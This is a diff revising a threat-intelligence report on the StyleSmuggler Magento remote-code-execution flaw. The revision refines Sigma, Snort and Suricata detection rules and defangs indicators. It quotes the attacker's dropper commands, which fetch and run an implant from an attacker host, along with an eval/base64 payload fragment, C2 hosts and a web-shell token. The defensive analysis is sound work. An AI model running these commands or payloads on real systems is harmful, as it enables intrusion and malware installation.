@@ -1,9 +1,10 @@
 # Technical Analysis Report: StyleSmuggler — Adobe Commerce / Magento Zero-Day RCE (CVE-2026-75650) (2026-09-08)
 
+<!-- revision: v1.1 2026-09-08 — (1) Sigma IP rule: removed 99.84.67.186 (AWS CloudFront anycast, FP risk), kept 185.157.160.251 + 209.141.43.95; (2) Suricata SID:2200006 rev:2: added content match for token value fced27f6d57702565353ecc11722533b; (3) Snort SID:2100002 msg corrected (dropped "/with_resolved"); (4) defanged all prose IOCs outside detection-rule code blocks -->
 Prepared by: Actioner
 Classification: TLP:CLEAR
 Date: 2026-09-08
-Version: 1.0
+Version: 1.1
 
 ## Executive Summary
 
@@ -29,7 +30,7 @@ Adobe Commerce (formerly Magento Commerce) and Magento Open Source are among the
 | 2026-09-05 15:08 | Store A targeted again; blocked at the web-server layer by newly deployed mitigation rules |
 | 2026-09-05 (day) | Sansec publishes its advisory naming the flaw "StyleSmuggler"; Disrex Group publishes an emergency mitigation repository |
 | 2026-09-05 17:08 | Store A targeted a third time with a changed trigger-header format (`X-<12hex>` instead of `X-TRACE-<10hex>`); blocked |
-| 2026-09-06 | A second implant build appears, masquerading as `fc-cache` (fontconfig cache builder) instead of `[kworker/u:8:0]`, introducing a fake-NTP UDP/123 C2 channel and a new download host, `209.141.43.95` |
+| 2026-09-06 | A second implant build appears, masquerading as `fc-cache` (fontconfig cache builder) instead of `[kworker/u:8:0]`, introducing a fake-NTP UDP/123 C2 channel and a new download host, `209.141.43[.]95` |
 | 2026-09-07 | A third implant build appears, masquerading as `chronyd` (NTP daemon); Adobe releases APSB26-146 / VULN-39341 at 20:20 UTC, one day ahead of its regular Patch Tuesday |
 | 2026-09-08 | Adobe's regularly scheduled September security-bulletin date; this report produced |
 
@@ -58,7 +59,7 @@ A distinctive **trigger header** accompanies exploitation, regenerated per reque
 On successful `include()`, the executed PHP is a minimal dropper that walks six exec primitives in order (`shell_exec`, `exec`, `system`, `passthru`, `proc_open`, `popen`) and uses the first one available, then downloads an architecture-matched implant:
 
 ```
-curl/wget https://247.cdnflare.xyz/files/kworker-linux-<arch>
+curl/wget hxxps://247.cdnflare[.]xyz/files/kworker-linux-<arch>
 chmod 755 /tmp/.kw_<random>
 nohup /tmp/.kw_<random> &
 ```
@@ -69,11 +70,11 @@ Notably, on one compromised store the first four exec functions were disabled bu
 
 | Build | Channel | Details |
 |---|---|---|
-| `[kworker/u:8:0]` (original, 4–5 Sep) | None observed / internal Redis | On one infected store the implant made **zero external network connections**, instead reading its instructions from the store's own Redis (`127.0.0.1:6379`, 28 connections observed). Sansec's advisory separately documents a WebSocket-over-TLS channel to `99.84.67.186:443` and a remote-shell channel to `windwsecurity.run:443` for this family. |
+| `[kworker/u:8:0]` (original, 4–5 Sep) | None observed / internal Redis | On one infected store the implant made **zero external network connections**, instead reading its instructions from the store's own Redis (`127.0.0.1:6379`, 28 connections observed). Sansec's advisory separately documents a WebSocket-over-TLS channel to `99.84.67[.]186:443` and a remote-shell channel to `windwsecurity[.]run:443` for this family. |
 | `fc-cache` (v2.1.4, from 6 Sep) | Fake-NTP over UDP/123 | Every 60 seconds, sends 48-byte UDP datagrams to a `ntp.*`-named host on port 123. Only the first four bytes are genuine NTP; the remainder is a MessagePack record carrying agent ID, hostname, username, OS, memory/disk usage, uptime, root-or-not status, implant version, and public IP. Marks packets as NTPv4 **server** mode — legitimate NTP clients never do this — and sends **nine** 48-byte datagrams per cycle where a real client sends one. Before beaconing, it learns the host's public IP via plain HTTP from `api4.ipify.org`, `ipv4.icanhazip.com`, `ipv4.ident.me`, and `ipinfo.io`, using a User-Agent truncated after `AppleWebKit/537.36` (matching no real browser). It also reads `TracerPid` from `/proc/self/status`; under a debugger it installs but never beacons. |
 | `chronyd` (v2.1.5, from 7 Sep) | Fake-NTP over UDP/123 | Same channel design as `fc-cache`, renamed again; parent PID 1 (init) observed on some hosts. |
 
-C2 domain `ntp.timesync.to` (and sibling `ntp.timesysnc.net`) resolved to `185.157.160.251` as of 7 September. Additional fallback fake-NTP hosts: `time.microsft.run`, `pool.microsft.studio`, `ntp.synctime.to`, `ntp.syncstime.to` — all deliberate typosquats of legitimate-sounding services. **Absence of any of this traffic on a given host does not indicate a clean host**: two 200MB+ packet captures taken from live infections contained none of it.
+C2 domain `ntp.timesync[.]to` (and sibling `ntp.timesysnc[.]net`) resolved to `185.157.160[.]251` as of 7 September. Additional fallback fake-NTP hosts: `time.microsft[.]run`, `pool.microsft[.]studio`, `ntp.synctime[.]to`, `ntp.syncstime[.]to` — all deliberate typosquats of legitimate-sounding services. **Absence of any of this traffic on a given host does not indicate a clean host**: two 200MB+ packet captures taken from live infections contained none of it.
 
 ### 4. Platform-Specific Behavior
 
@@ -136,7 +137,7 @@ StyleSmuggler and its payloads are Linux/PHP-specific — the implant is compile
 | Source IP | `91.238.181[.]19` | Second-wave attacker source (AS49434), 48 exploit requests, 17:08 CEST 5 Sep |
 | Source IP | `76.31.99[.]207`, `209.73.130[.]148`, `77.239.124[.]107`, `182.182.152[.]48` | Additional attacker-source IPs (secondary reporting) |
 
-> **Caveat on source IPs:** Disrex recorded **27 distinct source addresses across two waves** on just three stores — blocking the single IP in Sansec's advisory (`88.216.72.181`) alone stops less than a quarter of observed traffic. A subset of sources are consumer/residential ISP addresses consistent with a rented or compromised residential-proxy pool; **do not blanket-block these** — they are proxy exits, not attacker-owned infrastructure, and blocking them risks legitimate customer traffic. Correlate against your own logs instead.
+> **Caveat on source IPs:** Disrex recorded **27 distinct source addresses across two waves** on just three stores — blocking the single IP in Sansec's advisory (`88.216.72[.]181`) alone stops less than a quarter of observed traffic. A subset of sources are consumer/residential ISP addresses consistent with a rented or compromised residential-proxy pool; **do not blanket-block these** — they are proxy exits, not attacker-owned infrastructure, and blocking them risks legitimate customer traffic. Correlate against your own logs instead.
 
 ### Behavioral
 
@@ -154,12 +155,12 @@ StyleSmuggler and its payloads are Linux/PHP-specific — the implant is compile
 |-----|-----------|-------------------|
 | T1190 | Exploit Public-Facing Application | Unauthenticated object-injection chain through Magento's template filter, reachable via the storefront/GraphQL surface with no auth or user interaction |
 | T1140 | Deobfuscate/Decode Files or Information | Observed payload `POST /paypal/transparent/response/?<?=eval(base64_decode('...'))` |
-| T1105 | Ingress Tool Transfer | Dropper `curl`/`wget`s the architecture-matched Rust implant from `247.cdnflare.xyz` / `209.141.43.95` after code execution |
+| T1105 | Ingress Tool Transfer | Dropper `curl`/`wget`s the architecture-matched Rust implant from `247.cdnflare[.]xyz` / `209.141.43[.]95` after code execution |
 | T1036.005 | Masquerading: Match Legitimate Name or Location | Implant sets cmdline to `[kworker/u:8:0]` and later renames to `fc-cache`/`chronyd`, relocating into per-user cache directories that mimic legitimate GVFS/fontconfig/chrony paths |
 | T1564.001 | Hide Artifacts: Hidden Files or Directories | All persistence and staging paths use dot-prefixed hidden files/directories (`.gvfsd`, `.kw_`, `.fc_`, `.fc-`, `.chrony-`, `.cache_`) |
 | T1053.003 | Scheduled Task/Job: Cron | Persistence entry written directly to `/var/spool/cron/crontabs/<user>`, bypassing the `crontab` binary and syslog auditing |
 | T1001.003 | Data Obfuscation: Protocol or Service Impersonation | `fc-cache`/`chronyd` builds disguise C2 beacons as NTPv4 server-mode UDP/123 replies carrying a MessagePack payload |
-| T1071.001 | Application Layer Protocol: Web Protocols | WebSocket-over-TLS C2 and remote-shell channels to `99.84.67.186:443` and `windwsecurity.run:443` |
+| T1071.001 | Application Layer Protocol: Web Protocols | WebSocket-over-TLS C2 and remote-shell channels to `99.84.67[.]186:443` and `windwsecurity[.]run:443` |
 | T1505.003 | Server Software Component: Web Shell | Independent second actor drops a token-gated PHP web shell into `pub/media/catalog/product/cache/` via the same entry point |
 | T1082 | System Information Discovery | Recon probe (GraphQL query with a payload in the `Store:` header) harvests kernel/OS string, PHP process user, working directory, and `pub/media` writability |
 | T1048.003 | Exfiltration Over Alternative Protocol | Reconnaissance data chunked into 50-character labels and exfiltrated via DNS queries to an attacker-controlled OAST domain |
@@ -534,8 +535,8 @@ falsepositives:
 level: critical
 ```
 
-Confirmed StyleSmuggler C2/download IPs give a durable, IOC-independent-of-DNS detection surface.
-✅ Compiles (sigma check + splunk + log_scale) — Confidence: medium (IP infrastructure for this campaign class turns over quickly)
+Confirmed StyleSmuggler C2/download IPs (excluding 99.84.67[.]186, which is in the AWS CloudFront anycast range and would false-positive on legitimate CDN traffic).
+✅ Compiles (sigma check + splunk + log_scale) — Confidence: medium (IP infrastructure for this campaign class turns over quickly; CloudFront IP excluded)
 
 ```yaml
 title: Outbound Connection to StyleSmuggler C2 or Malware-Download IP
@@ -544,9 +545,13 @@ status: experimental
 description: >
     Detects outbound network connections to IP addresses confirmed as
     StyleSmuggler (CVE-2026-75650) command-and-control or implant-download
-    infrastructure: 99.84.67.186 (primary WebSocket-over-TLS C2), 185.157.160.251
-    (fake-NTP C2, resolved for ntp.timesync.to/ntp.timesysnc.net as of 7 September
-    2026), and 209.141.43.95 (fc-cache variant implant download host).
+    infrastructure: 185.157.160.251 (fake-NTP C2, resolved for
+    ntp.timesync.to/ntp.timesysnc.net as of 7 September 2026) and
+    209.141.43.95 (fc-cache variant implant download host). NOTE:
+    99.84.67.186 (WebSocket-over-TLS C2 per Sansec advisory) is excluded
+    because it falls within the AWS CloudFront anycast range
+    (99.84.0.0/16) and will match legitimate CDN-fronted traffic; treat
+    that IP as an audit-only indicator, not a blocking rule.
 references:
     - https://sansec.io/research/stylesmuggler-0day
     - https://github.com/disrex-group/stylesmuggler-mitigation/blob/main/IOC.md
@@ -559,14 +564,19 @@ logsource:
 detection:
     selection:
         DestinationIp:
-            - '99.84.67.186'
             - '185.157.160.251'
             - '209.141.43.95'
+    # AUDIT ONLY — not in detection selection:
+    # 99.84.67.186 (WebSocket-over-TLS C2 per Sansec advisory) sits in the
+    # AWS CloudFront anycast range 99.84.0.0/16. Any HTTPS traffic routed
+    # through this CDN edge node would fire; the IP will be reassigned.
     condition: selection
 falsepositives:
-    - None expected; monitor for IP churn as the campaign evolves and rotate
-      this list against the source advisory.
-level: high
+    - 185.157.160.251 may be reassigned after the campaign ends — monitor
+      the source advisory for IP churn and rotate this list accordingly.
+      99.84.67.186 was deliberately excluded (AWS CloudFront anycast —
+      see audit comment above).
+level: medium
 ```
 
 The secondary web-shell actor exfiltrates reconnaissance data via DNS queries to a dedicated OAST domain.
@@ -697,7 +707,7 @@ Four inline exploit-traffic signatures plus one C2-beacon rule, all validated ag
 ```
 alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - StyleSmuggler Magento/Adobe Commerce Object-Injection Gadget Parameter (CVE-2026-75650)"; flow:established,to_server; http_uri; content:"styles[", fast_pattern; classtype:web-application-attack; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created 2026-09-08; sid:2100001; rev:1;)
 
-alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - StyleSmuggler Object-Injection Driver Parameter generatorClass/with_resolved (CVE-2026-75650)"; flow:established,to_server; http_uri; content:"generatorClass", fast_pattern; classtype:web-application-attack; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created 2026-09-08; sid:2100002; rev:1;)
+alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - StyleSmuggler Object-Injection Driver Parameter generatorClass (CVE-2026-75650)"; flow:established,to_server; http_uri; content:"generatorClass", fast_pattern; classtype:web-application-attack; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created 2026-09-08; sid:2100002; rev:1;)
 
 alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Actioner - StyleSmuggler PHP Open Tag Smuggled in User-Agent Header (CVE-2026-75650)"; flow:established,to_server; http_header:field user-agent; content:"<?", fast_pattern; classtype:web-application-attack; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created 2026-09-08; sid:2100003; rev:1;)
 
@@ -709,7 +719,7 @@ alert udp $HOME_NET any -> 185.157.160.251 123 (msg:"Actioner - StyleSmuggler Fa
 ### Suricata
 
 The same coverage in Suricata dot-notation, plus a TLS SNI rule and a web-shell activation-header rule that Snort 3's sticky buffers cannot express as cleanly.
-✅ Compiles (`suricata -T`) — Confidence: high (exploit-traffic and TLS SNI rules); medium (UDP C2-beacon and X-Cache-Token header rules)
+✅ Compiles (`suricata -T`) — Confidence: high (exploit-traffic, TLS SNI, and X-Cache-Token header+value rules); medium (UDP C2-beacon rule)
 
 ```
 alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Actioner - StyleSmuggler Magento/Adobe Commerce Object-Injection Gadget Parameter (CVE-2026-75650)"; flow:established,to_server; http.uri; content:"styles["; fast_pattern; classtype:web-application-attack; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created_at 2026-09-08; sid:2200001; rev:1;)
@@ -722,7 +732,7 @@ alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - TLS Connection to 
 
 alert udp $HOME_NET any -> 185.157.160.251 123 (msg:"Actioner - StyleSmuggler Fake-NTP UDP C2 Beacon to 185.157.160.251 (CVE-2026-75650)"; dsize:48; classtype:trojan-activity; reference:url,sansec.io/research/stylesmuggler-0day; reference:cve,2026-75650; metadata:author Actioner, created_at 2026-09-08; sid:2200005; rev:1;)
 
-alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Actioner - StyleSmuggler Secondary PHP Web Shell Activation Header X-Cache-Token (CVE-2026-75650)"; flow:established,to_server; http.request_header; content:"X-Cache-Token"; fast_pattern; classtype:trojan-activity; reference:url,securityaffairs.com/198603; reference:cve,2026-75650; metadata:author Actioner, created_at 2026-09-08; sid:2200006; rev:1;)
+alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"Actioner - StyleSmuggler Secondary PHP Web Shell Activation Header X-Cache-Token (CVE-2026-75650)"; flow:established,to_server; http.request_header; content:"X-Cache-Token"; fast_pattern; content:"fced27f6d57702565353ecc11722533b"; classtype:trojan-activity; reference:url,securityaffairs.com/198603; reference:cve,2026-75650; metadata:author Actioner, created_at 2026-09-08; sid:2200006; rev:2;)
 ```
 
 <!--
@@ -774,11 +784,11 @@ Suricata: all 6 rules validated via `suricata -T -S <file>.rules -l /tmp/actione
 provided was successfully loaded. Exiting.") on the second attempt — the first attempt used multi-line
 parenthesized rule bodies (valid in the reference doc's Snort examples) which Suricata's parser rejected
 ("Signature missing required value sid" / "no rule options"); reformatting to strict single-line-per-rule
-resolved this cleanly with no other changes. The X-Cache-Token rule uses the generic `http.request_header`
-buffer (searches concatenated header blob) rather than a name-scoped header buffer, since Suricata has no
-direct equivalent to Snort's `http_header:field <name>` for arbitrary custom header names in this ruleset
-version; confidence rated medium accordingly (a coincidental "X-Cache-Token" substring elsewhere in headers
-is unlikely but not structurally impossible).
+resolved this cleanly with no other changes. The X-Cache-Token rule (SID:2200006, rev:2) now matches both the header name
+`X-Cache-Token` AND the specific token value `fced27f6d57702565353ecc11722533b` within the
+`http.request_header` buffer, bringing it in line with the YARA web-shell rule's token matching and
+eliminating false positives from unrelated caching layers that use a same-named header with a different
+value. Confidence upgraded from medium to high for this combination.
 
 Provenance: all IOCs cross-referenced across Sansec (sansec.io/research/stylesmuggler-0day — primary
 discoverer), Disrex Group's live-incident-response GitHub repo (disrex-group/stylesmuggler-mitigation —
